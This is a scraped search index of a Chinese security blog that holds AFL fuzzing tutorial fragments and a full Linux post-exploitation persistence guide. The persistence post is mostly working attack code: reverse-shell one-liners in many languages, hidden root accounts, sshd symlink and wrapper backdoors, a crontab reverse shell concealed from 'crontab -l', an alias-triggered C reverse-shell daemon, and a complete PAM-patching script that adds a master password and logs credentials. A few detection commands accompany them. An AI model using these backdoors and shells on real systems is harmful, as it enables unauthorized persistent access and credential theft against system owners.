\u003clcamtuf@google.com\u003e [*] Executing '/usr/bin/djpeg'... -- Program output begins -- Premature end of JPEG file JPEG datastream contains no image -- Program output ends -- [+] Captured 59 tuples in 'map/id:000021,src:000011,op:flip32,pos:2,+cov'. ------------------------------------- id:000026,src:000021,op:havoc,rep:2 afl-showmap 2.56b by \u003clcamtuf@google.com\u003e [*] Executing '/usr/bin/djpeg'... -- Program output begins -- Premature end of JPEG file JPEG datastream contains no image -- Program output ends -- [+] Captured 60 tuples in 'map/id:000026,src:000021,op:havoc,rep:2'. ------------------------------------- 可以看到上面样本id为21和26的输出结果相同，但是执行路径不同，可以使用 diff 指令进行路径对比： diff -Nu map/id\\:000021\\,src\\:000011\\,op\\:flip32\\,pos\\:2\\,+cov map/id\\:000026\\,src\\:000021\\,op\\:havoc\\,rep\\:2 结果如下： --- map/id:000021,src:000011,op:flip32,pos:2,+cov 2019-12-03 06:38:42.236000000 +0000 +++ map/id:000026,src:000021,op:havoc,rep:2 2019-12-03 06:38:42.388000000 +0000 @@ -1,20 +1,21 @@ 003224:1 004793:1 005209:1 -005993:1 +005993:2 006601:1 007073:1 008498:1 008874:1 -010130:1 +010130:2 010146:1 010282:1 -013459:1 +013459:2 +014971:1 017564:1 018892:1 019132:1 019148:1 -019172:1 +019172:2 019188:1 019236:1 019804:1 @@ -33,18 +34,18 @@ 032872:1 033112:1 037297:1 -037433:1 +037433:2 037817:1 039585:1 -039641:2 -043450:1 +039641:4 +043450:2 043562:1 044194:1 044818:1 045483:1 046955:1 047603:1 -048251:1 +048251:2 051300:1 052444:1 053124:1 从最初的只有文本内容“test”的样本，afl确实已经发现了很多其它路径，但是在我的测试结果中还是没有fuzz出正常的图片文件，从输出结果上看样本id为21和26算是比较接近，没有报明显错误。 Premature end of JPEG file JPEG datastream contains no image ","date":"2020-12-04","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/:3:1","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 2","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/"},{"categories":["Fuzz"],"content":"参考链接 https://github.com/google/AFL https://www.secpulse.com/archives/71903.html https://www.freebuf.com/articles/system/191536.html http://zeroyu.xyz/2019/05/15/how-to-use-afl-fuzz https://lcamtuf.blogspot.com/2014/11/pulling-jpegs-out-of-thin-air.html https://paper.seebug.org/841/ https://paper.seebug.org/496/#part-2afl https://rk700.github.io/2017/12/28/afl-internals/ https://rk700.github.io/2018/01/04/afl-mutations/ https://rk700.github.io/2018/02/02/afl-enhancement/ ","date":"2020-12-04","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/:3:2","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 2","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/"},{"categories":["Misc"],"content":"Linux 下的权限维持","date":"2020-12-04","objectID":"/2020/12/backdoor/","tags":["Linux"],"title":"Linux 下的权限维持","uri":"/2020/12/backdoor/"},{"categories":["Misc"],"content":"权限维持 – Linux ","date":"2020-12-04","objectID":"/2020/12/backdoor/:0:0","tags":["Linux"],"title":"Linux 下的权限维持","uri":"/2020/12/backdoor/"},{"categories":["Misc"],"content":"一、Basic Knowledge ","date":"2020-12-04","objectID":"/2020/12/backdoor/:1:0","tags":["Linux"],"title":"Linux 下的权限维持","uri":"/2020/12/backdoor/"},{"categories":["Misc"],"content":"1. 概念 可以简单理解为通过隐藏手段或在目标上安装后门以保持已获取的权限不会被打掉，一直控制目标，属于后渗透阶段的重点内容。 ","date":"2020-12-04","objectID":"/2020/12/backdoor/:1:1","tags":["Linux"],"title":"Linux 下的权限维持","uri":"/2020/12/backdoor/"},{"categories":["Misc"],"content":"2. 前置条件 – 获取初始权限 获取初始权限。最常见也是个人最喜欢的是反弹shell回来，方便后续操作。这里简单总结下反弹shell的常见手法： 1. Bash反弹 攻击机监听： nc -lvvp port 目标执行： bash -i \u003e\u0026 /dev/tcp/x.x.x.x/port 0\u003e\u00261 或者 bash -i 5\u003c\u003e/dev/tcp/host/port 0\u003e\u00265 1\u003e\u00265 bash -i：打开一个交互的bash \u003e\u0026 /dev/tcp/x.x.x.x/port：调用socket建立链接，x.x.x.x为要接收shell的主机ip，port为端口，将标准错误和标准输出重定向到socket连接文件。 0\u003e\u00261：标准输入重定向到标准输出，此时标准输出指向socket连接，从而实现了与反弹shell的交互。 第二种则是将标准输入、输出和错误均重定向到socket连接文件。 备注：Linux不同发行版之间存在差异，某些命令可能并不适用，可自行调整。 2. telnet反弹 第一种： 攻击机开2个终端，分别执行监听： nc -lv port1 和 nv -lv port2 目标主机执行： telent x.x.x.x port1 | /bin/bash | telnet x.x.x.x port2 监听2个端口分别用来输入和输出，其中x.x.x.x均为攻击者ip。 第二种： 攻击机监听： nc -lv port 目标主机执行： rm -f /tmp/a;mknod /tmp/a p;telnet x.x.x.x port 0\u003c/tmp/a | /bin/bash 1\u003etmp/a 其中x.x.x.x为攻击机ip。 3. nc(netcat)反弹 攻击机监听： nc -lv port 目标执行： nc -e /bin/bash x.x.x.x port 如果目标上没有-e参数可以使用以下命令： rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2\u003e$1 | nc x.x.x.x port \u003e/tmp/f mkfifo的作用是创建FIFO特殊文件，也称为命名管道。FIFO文件在磁盘上没有数据块，仅用来标识内核中的一条通道，各进程可以打开FIFO文件进行读写操作，本质上就是在读写内核通道，这样就可以实现进程间通信。 此外，也可以使用telnet的监听2个端口的方式： nc x.x.x.x port1 | /bin/bash | nc x.x.x.x port2 4. 常见脚本反弹 下述脚本均需要现在攻击机上开启监听：nc -lv port，将脚本中ip替换为对应的攻击机IP，port替换为实际使用的端口。 1. Python python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"x.x.x.x\",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);' 2. Perl 第一种： perl -e 'use Socket;$i=\"x.x.x.x\";$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"\u003e\u0026S\");open(STDOUT,\"\u003e\u0026S\");open(STDERR,\"\u003e\u0026S\");exec(\"/bin/sh -i\");};' 第二种： perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"x.x.x.x:port\");STDIN-\u003efdopen($c,r);$~-\u003efdopen($c,w);system$_ while\u003c\u003e;' 3. Ruby 第一种： ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"x.x.x.x\",\"port\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end' 第二种： ruby -rsocket -e'f=TCPSocket.open(\"x.x.x.x\",port).to_i;exec sprintf(\"/bin/sh -i \u003c\u0026%d \u003e\u0026%d 2\u003e\u0026%d\",f,f,f)' 4. PHP php -r '$sock=fsockopen(\"x.x.x.x\",port);exec(\"/bin/bash -i \u003c\u00263 \u003e\u00263 2\u003e\u00263\");' 5. Java public class Revs { /** * @param args * @throws Exception */ public static void main(String[] args) throws Exception { // TODO Auto-generated method stub Runtime r = Runtime.getRuntime(); String cmd[]= {\"/bin/bash\",\"-c\",\"exec 5\u003c\u003e/dev/tcp/x.x.x.x/port;cat \u003c\u00265 | while read line; do $line 2\u003e\u00265 \u003e\u00265; done\"}; Process p = r.exec(cmd); p.waitFor(); } } 6. Lua lua -e \"require('socket');require('os');t=socket.tcp();t:connect('x.x.x.x','port');os.execute('/bin/sh -i \u003c\u00263 \u003e\u00263 2\u003e\u00263');\" 3. 其他方法 1. socat 攻击机监听： socat file:`tty`,raw,echo=0 tcp-listen:port 上传socat到目标主机，然后执行： socat exec:'bash -li',pty,stderr,setid,sigint,sane tcp x.x.x.x:port 2. 只有80和443端口且反弹shell流量被拦截 方法论：加密流程，绕过拦截 Step 1：VPS上生成SSL证书的公钥/私钥对 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes Step 2：VPN监听反弹shell openssl s_server -quiet -key key.pem -cert cert.pem -port 443 Step 3：连接 mkfifo /tmp/v4ler1an;/bin/bash -i \u003c /tmp/v4ler1an 2\u003e\u00261 |openssl s_client -quiet -connect x.x.x.x:443 \u003e /tmp/v4ler1an 此时的shell存在缺陷（无法命令补全等），通过以下方法修复： python -c 'import pty; pty.spawn(\"/bin/bash\")' pty是一个伪终端模块。pty.spawn(argv[, master_read[, stdin_read]])产生一个进程，并将其控制终端与当前进程的标准输入输出连接。这通常用于阻挡坚持从控制终端读取的程序。向函数 master_read 和 stdin_read 传递了文件描述符，它们应从中读取，并且它们应始终返回字节字符串。两个函数的默认实现在每次函数被调用时将读取并返回至多 1024 个字节。 会向 master_read 回调传入伪终端的主文件描述符以从子进程读取输出，而向 stdin_read 传入文件描述符 0 以从父进程的标准输入读取数据。 在 3.4 版更改: spawn() 现在从子进程的 os.waitpid() 返回状态值 ","date":"2020-12-04","objectID":"/2020/12/backdoor/:1:2","tags":["Linux"],"title":"Linux 下的权限维持","uri":"/2020/12/backdoor/"},{"categories":["Misc"],"content":"二、权限维持方法 ","date":"2020-12-04","objectID":"/2020/12/backdoor/:2:0","tags":["Linux"],"title":"Linux 下的权限维持","uri":"/2020/12/backdoor/"},{"categories":["Misc"],"content":"1. 一句话添加用户和密码 添加普通用户： # 创建一个用户名guest，密码为123456的普通用户 useradd -p `openssl passwd -1 -salt 'salt' 123456` guest # useradd -p 方法 `` 是用来存放可执行的系统命令。“$()”也可以存放命令执行语句。 useradd -p \"$(openssl passwd -1 123456)\" guest # chpasswd方法 useradd guest;echo 'guest:123456'|chpasswd # echo -e方法 useradd guest;echo -e \"123456\\n123456\\n\" |passwd guest 添加root用户： # 创建一个用户名为guest，密码为123456的root用户 useradd -p `openssl passwd -1 -salt 'salt' 123456` guest -o -u 0 -g root -G root -s /bin/bash -d /home/guest 排查方法： # 查询特权用户（uid = 0） awk -F: '$3==0{print $1}' /etec/passwd # 查询可以远程登录的帐号信息 awk '/\\$1|\\$6/{print $1}' /etc/shadow # 除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限 more /etc/sudoers | grep -v \"^#\\|^$\" | grep \"ALL=(ALL)\" ","date":"2020-12-04","objectID":"/2020/12/backdoor/:2:1","tags":["Linux"],"title":"Linux 下的权限维持","uri":"/2020/12/backdoor/"},{"categories":["Misc"],"content":"2. 增加超级用户 在完成用户添加后，可以对添加的用户赋予超级用户权限。 目标主机执行： echo \"v4ler1an:x:0:0::/:/bin/sh\" \u003e\u003e /etc/passwd 如果目标系统不允许uid=0的用户远程登录，可以增加一个普通用户账号： echo \"v4ler1an::-1:-1:-1:-1:-1:-1:500\" \u003e\u003e /etc/shadow 有些情况下添加不成功可能是因为密码强度不够，可以适当增加密码强度。 ","date":"2020-12-04","objectID":"/2020/12/backdoor/:2:2","tags":["Linux"],"title":"Linux 下的权限维持","uri":"/2020/12/backdoor/"},{"categories":["Misc"],"content":"1. SSH后门 1. sshd 软连接 目标主机建立软连接： ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=5555; 攻击机直接ssh登录 ssh root@x.x.x.x -p 5555 这里端口可以任意，但是/tmp/su部分有限制。可以使用任意密码进行登录，在sshd服务配置运行PAM认证的前提下，PAM配置文件中控制标志为sufficient时只要pam_rootok模块检测uid为0即root权限即可成功认证登陆。通过软连接的方式，实质上PAM认证是通过软连接的文件名 /tmp/su 在/etc/pam.d/目录下寻找对应的PAM配置文件(如: /etc/pam.d/su)，任意密码登陆的核心是auth sufficient pam_rootok.so，所以只要PAM配置文件中包含此配置即可SSH任意密码登陆，除了su中之外还有chsh、chfn同样可以。具体原理详见Linux的一个后门引发对PAM的探究。 缺点：易被排查，通过进程、端口可以轻松看到异常，使用kill -s 9 PID即可清除后门。 2. ssh免密后门(文件落地) 在攻击机上生成一对公私钥，然后将公钥上传到目标主机，路径为~/.ssh/authorized_keys，攻击机本地保存私钥。通过ssh登录，ssh程序会发送私钥到目标主机与公钥进行匹配，匹配通过即可实现ssh登录。 生成公钥和私钥： ssh-keygen -t rsa 进入/root/.ssh，将公钥id_rsa.pub的内容复制到目标主机（是否上传替换文件取决于具体情况），在/root/.ssh/authorized_keys中追加id_rsa.pub中的内容，配置完成。(有些系统没有keys文件，可以自行创建一个。) 缺点：易被排查，检查/root/.ssh/authorized_keys是否被修改，清理不受信的公钥即可清除后门。 3. ssh wrapper（文件落地） 目标主机上执行： cd /usr/sbin/ mv sshd ../bin/ echo '#!/usr/bin/perl' \u003esshd echo 'exec \"/bin/sh\" if(getpeername(STDIN) =~ /^..4A/);' \u003e\u003esshd echo 'exec{\"/usr/bin/sshd\"} \"/usr/sbin/sshd\",@ARGV,' \u003e\u003esshd chmod u+x sshd /etc/init.d/sshd restart 完成后执行cat sshd进行验证，输出如下则说明配置成功： #!/usr/bin/perl exec \"/bin/sh\" if(getpeername(STDIN) =~ /^..4A/); exec{\"/usr/bin/sshd\"} \"/usr/sbin/sshd\",@ARGV, 攻击机上执行： socat STDIO TCP4:x.x.x.x:22,sourceport=13377 这里的sourceport可以进行修改，但是需要使用python的struct标准库实现。 python \u003e\u003e\u003e import struct \u003e\u003e\u003e buffer = struct.pack('\u003eI6',19256) \u003e\u003e\u003e print repr(buffer) '\\x00\\x00LF' \u003e\u003e\u003e buffer = struct.pack('\u003eI6',13377) \u003e\u003e\u003e print buffer 4A 原理简单说明：init首先启动的是/usr/sbin/sshd,脚本执行到getpeername这里的时候，正则匹配会失败，于是执行下一句，启动/usr/bin/sshd，这是原始sshd。原始的sshd监听端口建立了tcp连接后，会fork一个子进程处理具体工作。这个子进程，没有什么检验，而是直接执行系统默认的位置的/usr/sbin/sshd，这样子控制权又回到脚本了。此时子进程标准输入输出已被重定向到套接字，getpeername能真的获取到客户端的TCP源端口，如果是19526就执行sh给个shell 简单点就是从sshd程序fork出一个子进程，输入输出重定向到套接字，并对连过来的客户端端口进行判断。 排查方法： ls -al /usr/sbin/sshd cat /usr/sbin/sshd 如果想彻底恢复的话，需要进行ssh服务的重装。 4. ssh的隐身登录 在进行ssh登录时可以使用以下命令实现隐身登录，避免被last\\who\\w等指令检测到。 # 不被last\\who\\w等指令检测 ssh -T username@x.x.x.x /bin/bash -i # 不记录ssh公钥在本地.ssh目录中 ssh -o UserKnownHostFile=/dev/null -T user@x.x.x.x /bin/bash -if ","date":"2020-12-04","objectID":"/2020/12/backdoor/:2:3","tags":["Linux"],"title":"Linux 下的权限维持","uri":"/2020/12/backdoor/"},{"categories":["Misc"],"content":"3. SUID Shell 需要配合普通用户进行使用。root权限下执行如下命令，普通用户运行/dev/.rootshell即可获得root权限： cp /bin/bash /dev/.rootshell chmod u+s /dev/.rootshell 备注：bash2针对suid做了一些防护措施，需要使用-p参数来获取一个root shell。另外，普通用户执行这个SUID shell时，一定要使用全路径。该方法个人认为较为鸡肋，且bash版本现在较高，可利用性不高。 ","date":"2020-12-04","objectID":"/2020/12/backdoor/:2:4","tags":["Linux"],"title":"Linux 下的权限维持","uri":"/2020/12/backdoor/"},{"categories":["Misc"],"content":"4. crontab后门（文件落地） crontab命令用于设置周期性被执行的指令，可以利用该命令新建shell脚本，利用脚本进行反弹。 Step 1 ：创建shell脚本，例如在/etc/evil.sh #!/bin/bash bash -i \u003e\u0026 /dev/tcp/192.168.160.154/12345 0\u003e\u00261 并给脚本赋予相应权限： chmod +sx /etc/evil.sh Step 2：设置定时服务 crontab -e 输入以下内容： # exec per min */1 * * * * root /etc/evil.sh 重启crond服务，service crond restart，然后使用nc接收shell。 上述方法在实际测试中成功了率较低，建议使用一句话后门： (crontab -l;printf \"*/1 * * * * /tmp/crontab_backdoor.sh;\\rno crontab for `whoami`%100c\\n\")|crontab - 这种方式成功率更高，而且不易被crontab -l发现。 其中关于crondtab的详细原理可以参考：https://cloud.tencent.com/developer/article/1683265 排查手段： # 查看可以的定时任务列表 crontab -e ","date":"2020-12-04","objectID":"/2020/12/backdoor/:2:5","tags":["Linux"],"title":"Linux 下的权限维持","uri":"/2020/12/backdoor/"},{"categories":["Misc"],"content":"5. alias欺骗（文件落地） 可以通过alias命令来执行特定的命令时静默运行其他程序，从而达到启动后门，记录键值等作用。2个实例： 修改ssh命令，利用strace，使其具有记录ssh对read、write、connect调用的功能： alias ssh='strace -o /tmp/sshpwd-`date '+%d%h%m%s'`.log -e read,write,connect -s2048 ssh' 利用守护进程回弹shell alias cat='cat\u0026\u0026/root/.shell' 回弹shell的c语言版脚本： // shell.c #include \u003cstdio.h\u003e #include \u003cunistd.h\u003e #include \u003cstdlib.h\u003e #include \u003ctime.h\u003e #include \u003cfcntl.h\u003e #include \u003cstring.h\u003e #include \u003csys/stat.h\u003e #include \u003csignal.h\u003e #define ERR_EXIT(m) do { perror(m); exit(EXIT_FAILURE); } while (0); void creat_daemon(void); int main(void) { time_t t; int fd; creat_daemon(); // 将ip和端口进行替换 system(\"bash -i \u003e\u0026 /dev/tcp/192.168.80.147/12345 0\u003e\u00261\"); return 0; } void creat_daemon(void) { pid_t pid; int devnullfd,fd,fdtablesize; umask(0); pid = fork(); if( pid == -1) ERR_EXIT(\"fork error\"); if(pid \u003e 0 ) exit(EXIT_SUCCESS); if(setsid() == -1) ERR_EXIT(\"SETSID ERROR\"); chdir(\"/\"); /* close any open file descriptors */ for(fd = 0, fdtablesize = getdtablesize(); fd \u003c fdtablesize; fd++) close(fd); devnullfd = open(\"/dev/null\", 0); /* make STDIN ,STDOUT and STDERR point to /dev/null */ if (devnullfd == -1) { ERR_EXIT(\"can't open /dev/null\"); } if (dup2(devnullfd, STDIN_FILENO) == -1) { ERR_EXIT(\"can't dup2 /dev/null to STDIN_FILENO\"); } if (dup2(devnullfd, STDOUT_FILENO) == -1) { ERR_EXIT(\"can't dup2 /dev/null to STDOUT_FILENO\"); } if (dup2(devnullfd, STDERR_FILENO) == -1) { ERR_EXIT(\"can't dup2 /dev/null to STDOUT_FILENO\"); } signal(SIGCHLD,SIG_IGN); return; } 使用nc监听回弹的shell。 ","date":"2020-12-04","objectID":"/2020/12/backdoor/:2:6","tags":["Linux"],"title":"Linux 下的权限维持","uri":"/2020/12/backdoor/"},{"categories":["Misc"],"content":"6. Linux PAM密码记录后门（文件落地） PAM(Pluggable Authentication Modules)，是由Sun提出的一种认证机制。它通过一共一些动态链接库和一套统一的API，将系统提供的服务和该服务的认证方式分开，使得系统管理员可以灵活地根据需要给不同的服务配置不同的认证方式而无需更改服务程序，同时也便于向系统中添加新的认证手段。这种后门主要是通过pam_unix_auth.c打补丁的方式潜入到正常的pam模块中，以此来记录管理员的账号密码。其大致流程如下： 获取目标系统所使用的PAM版本，下载对应版本的pam版本 解压缩，修改pam_unix_auth.c文件，添加万能密码 编译安装PAM 编译完后的文件在：modules/pam_unix/.libs/pam_unix.so，复制到/lib64/security中进行替换，即可使用万能密码登陆，并将用户名密码记录到文件中。 一个自动化脚本如下： #!/bin/bash ## ##查看版本: ##redhat yum list pam ##debian\u0026Ubuntu dpkg -s libpam-modules | grep -i version | cut -d' ' -f2 ## PASS='test123' ##...... LOG='\\/bin\\/.sshlog' ##...... echo \" .___ ___. ___ ___ _______ ____ ____ | \\/ | / _ \\ / _ \\ | \\ \\ \\ / / | \\ / | | | | | | | | | | .--. | \\ \\/ / | |\\/| | | | | | | | | | | | | | \\_ _/ | | | | | |_| | | |_| | | '--' | | | |__| |__| \\___/ \\___/ |_______/ |__| \" echo -e \"\\nPam-Backdoor\\n{code this shit while learning pam}\\n\\n\" oldtime=`stat -c '%z' /lib/security/pam_ftp.so` echo 'Pam backdoor starting!' mirror_url='http://www.linux-pam.org/library/Linux-PAM-1.1.1.tar.gz' #mirror_url='http://yum.singlehop.com/pub/linux/libs/pam/pre/library/Linux-PAM-0.99.6.2.tar.gz'，修改为对应的pam版本 echo 'Fetching from '$mirror_url wget $mirror_url #fetch the roll tar zxf Linux-PAM-1.1.1.tar.gz #untar,修改为对应的pam版本 cd Linux-PAM-1.1.1 #find and replace sed -i -e 's/retval = _unix_verify_password(pamh, name, p, ctrl);/retval = _unix_verify_password(pamh, name, p, ctrl);\\n\\tif (strcmp(p,\"'$PASS'\")==0 ){retval = PAM_SUCCESS;}if(retval == PAM_SUCCESS){\\n\\tFILE * fp;\\n\\tfp = fopen(\"'$LOG'\", \"a\");\\n\\tfprintf(fp, \"%s : %s\\\\n\", name, p);\\n\\tfclose(fp);\\n\\t}/g' modules/pam_unix/pam_unix_auth.c DIS=`head /etc/issue -n 1|awk '{print $1}'` #get the version if [ $DIS = \"CentOS\" ];then ./configure --disable-selinux \u0026\u0026 make else ./configure \u0026\u0026 make fi #copy modified pam_unix.so if [ `uname -p` = 'x86_64' ];then LIBPATH=lib64 else LIBPATH=lib fi /bin/cp -rf /$LIBPATH/security/pam_unix.so /$LIBPATH/security/pam_unix.so.bak #.. ......... /bin/cp -rf modules/pam_unix/.libs/pam_unix.so /$LIBPATH/security/pam_unix.so touch -d \"$oldtime\" /lib/security/pam_unix.so cd .. \u0026\u0026 rm -rf Linux-PAM-1.1.1* echo \"Done bro..\" 可以根据需要将下载pam部分修改为上传本地下载好的pam，这样可以避免目标主机无法访问对应链接地址时造成的文件下载失败。 Linux PAM版本地址：http://www.linux-pam.org/library/ 详细情况可参考https://blog.51cto.com/redkey/1343316 ","date":"2020-12-04","objectID":"/2020/12/backdoor/:2:7","tags":["Linux"],"title":"Linux 下的权限维持","uri":"/2020/12/backdoor/"},{"categories":["Misc"],"content":"5. PROMPT_COMMAND后门 bash提供来一个环境变量PROMPT_COMMAND，这个变量会在执行命令前执行一遍。 export PROMPT_COMMAND=\"lsof -i:1025 \u0026\u003e/dev/null || (python -c \"exec('encoded_payload'.decode('base64'))\" 2\u003e/dev/null \u0026)\" 也可以使用该变量进行提权：https://www.anquanke.com/post/id/155943 ","date":"2020-12-04","objectID":"/2020/12/backdoor/:2:8","tags":["Linux"],"title":"Linux 下的权限维持","uri":"/2020/12/backdoor/"},{"categories":["Misc"],"content":"7. Rootkit 根据搜索情况来看，一般水平的rootkit很容易将系统环境搞崩，而高质量的Rootkit不太容易找，因此如非迫不得已，不是很建议直接使用这种方法。如果能单独进行定制，是另外一种情况。这里暂时先给出一个收集的rootkit库：https://github.com/d30sa1/RootKits-List-Download ","date":"2020-12-04","objectID":"/2020/12/backdoor/:2:9","tags":["Linux"],"title":"Linux 下的权限维持","uri":"/2020/12/backdoor/"},{"categories":["Misc"],"content":"参考文献 https://wiki.bash-hackers.org/howto/redirection_tutorial https://www.gnu.org/software/bash/manual/html_node/Redirections.html https://brucetg.github.io/2018/05/03/%E5%A4%9A%E7%A7%8D%E5%A7%BF%E5%8A%BF%E5%8F%8D%E5%BC%B9shell/ https://www.anquanke.com/post/id/171891#h2-15 https://bypass007.github.io/Emergency-Response-Notes/privilege/%E7%AC%AC4%E7%AF%87%EF%BC%9ALinux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E5%90%8E%E9%97%A8%E7%AF%87.html https://www.anquanke.com/post/id/155943#h2-9 ","date":"2020-12-04","objectID":"/2020/12/backdoor/:3:0","tags":["Linux"],"title":"Linux 下的权限维持","uri":"/2020/12/backdoor/"},{"categories":["Fuzz"],"content":"AFL二三事系列 note 1","date":"2020-12-03","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 1","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/"},{"categories":["Fuzz"],"content":"AFL二三事 – 1 本文是AFL系列第一篇，主要介绍AFL的基本使用。 ","date":"2020-12-03","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/:0:0","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 1","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/"},{"categories":["Fuzz"],"content":"一、简介 AFL（American Fuzzy Lop）是由安全研究员Michal Zalewski（@lcamtuf）开发的一款基于覆盖引导（Coverage-guided）的模糊测试工具，它通过记录输入样本的代码覆盖率，从而调整输入样本以提高覆盖率，增加发现漏洞的概率。 ","date":"2020-12-03","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/:1:0","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 1","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/"},{"categories":["Fuzz"],"content":"二、工作流程 对于有源码的情况下，AFL的工作流程大致如下： 源码编译时进行插桩； 选择输入文件，构建语料库，加入输入队列； 对队列中的文件按照一定的策略进行“变异”； 如果经过变异的文件更新了代码覆盖路径，则保留文件并添加到队列中； 循环执行上述过程，记录触发crash的文件。 ","date":"2020-12-03","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/:2:0","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 1","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/"},{"categories":["Fuzz"],"content":"三、使用 ","date":"2020-12-03","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/:3:0","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 1","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/"},{"categories":["Fuzz"],"content":"1. 基本使用 AFL安装完成后，生成的可执行程序及其作用整体概括如下： 下面对每个可执行文件做详细的使用描述： 1. 编译指令 afl-gcc、afl-g++、afl-clang、afl-clang++、afl-clang-fast、afl-clang-fast++这些afl的编译指令，支持使用gcc、g++、clang、clang++的任何选项，因为这些指令的本质还是调用当前系统的对应编译指令，比如使用afl-gcc进行源码插桩编译： # 指令格式： afl-gcc [参数] 源文件 afl-gcc test.c -o test 2. afl-cmin, afl-tmin afl-cmin和afl-tmin都是用于简化样本的，可以简单的理解为前者裁剪样本集合，将执行路径相同的样本剔除掉只保留一个，后者是对单个样本的裁剪，例如，in_afl目录下存放样本，使用afl-cmin对样本集合进行裁剪，将新的集合输出到in_afl_min中，然后使用afl-tmin对in_afl_min中名为1.jpeg的文件进行裁剪，输出到1_new.jpeg文件中，fuzz的目标程序为/usr/bin/djpeg，该程序使用方法为/usr/bin/djpeg [参数] 要解析的图片文件： # 指令格式： afl-cmin -i 样本目录 -o 输出目录 [-Q] -- 要fuzz的可执行程序 [程序参数] # 指令格式： afl-tmin -i 样本文件 -o 输出文件 [-Q] -- 要fuzz的可执行程序 [程序参数] # 其中 '要fuzz的可执行程序' 必须是带有路径的，不能直接使用，比如 'djpeg 1.jpeg' 可以执行成功，但是fuzz时必须将 'djpeg' 的路径一并带上才可以，即 '/usr/bin/djpeg' # 默认情况下afl-cmin和afl-tmin会把样本以标准输出的方式喂给要fuzz的程序，如果fuzz程序是从参数指定的文件中读取数据进行处理的，则需要使用 '@@' 来代替输入的文件路径，比如原本执行的指令为 'djpeg in_afl_min/1.jpeg' ，fuzz时指令应为 '/usr/bin/djpeg @@' # 在安装了qemu-mode时，可以支持 '-Q' 选项，如果目标可执行程序 # 当然这两个指令还有一些其它参数，这里就不介绍使用了，以上为常见用法 afl-cmin -i in_afl -o in_afl_min -Q -- /usr/bin/djpeg @@ afl-tmin -i in_afl_min/1.jpeg -o in_afl_min/1_new.jpeg -Q -- /usr/bin/djpeg @@ 3. afl-analyze afl-analyze用于分析样本，比如分析一个样本1.jpeg，被fuzz程序为/usr/bin/djpeg，该程序使用方法为/usr/bin/djpeg [参数] 要解析的图片文件 # 指令格式： afl-analyze -i 样本文件 [-Q] -- 要fuzz的可执行程序 [程序参数] # 其中 '要fuzz的可执行程序' 必须是带有路径的，不能直接使用，比如 'djpeg 1.jpeg' 可以执行成功，但是fuzz时必须将 'djpeg' 的路径一并带上才可以，即 '/usr/bin/djpeg' # 默认情况下afl-cmin和afl-tmin会把样本以标准输出的方式喂给要fuzz的程序，如果fuzz程序是从参数指定的文件中读取数据进行处理的，则需要使用 '@@' 来代替输入的文件路径，比如原本执行的指令为 'djpeg in_afl_min/1.jpeg' ，fuzz时指令应为 '/usr/bin/djpeg @@' # 在安装了qemu-mode时，可以支持 '-Q' 选项，如果目标可执行程序 afl-analyze -i in_afl_min/1.jpeg -Q -- /usr/bin/djpeg @@ 4. afl-showmap afl-showmap用于分析样本的执行路径，比如分析一个样本1.jpeg，被fuzz程序为/usr/bin/djpeg，该程序使用方法为/usr/bin/djpeg [参数] 要解析的图片文件 # 指令格式（从标准输入中读取）： afl-showmap -o 存放结果的文件 -- 要fuzz的可执行程序 [程序参数] \u003c 样本文件路径 # 指令格式（从参数指定文件中读取输入）： afl-showmap -o 存放结果的文件 -- 要fuzz的可执行程序 [程序参数] # 其中 '要fuzz的可执行程序' 必须是带有路径的，不能直接使用，比如 'djpeg 1.jpeg' 可以执行成功，但是fuzz时必须将 'djpeg' 的路径一并带上才可以，即 '/usr/bin/djpeg' # 在安装了qemu-mode时，可以支持 '-Q' 选项，如果目标可执行程序 # 因为/usr/bin/djpeg指令即可用参数指定文件，也可以直接标准输入，所以以下两种方式均可 afl-showmap -o map -Q -- /usr/bin/djpeg in_afl_min/1.jpeg afl-showmap -o map -Q -- /usr/bin/djpeg \u003c in_afl_min/1.jpeg # 查看结果 cat map 5. afl-fuzz afl-fuzz是真正进行fuzz的程序，通过afl-fuzz help可以查看支持的所有选项（其它命令也可以），选项如下 afl-fuzz 2.56b by \u003clcamtuf@google.com\u003e afl-fuzz [ options ] -- /path/to/fuzzed_app [ ... ] Required parameters（必须参数）: -i dir - input directory with test cases - 存放样本的目录 -o dir - output directory 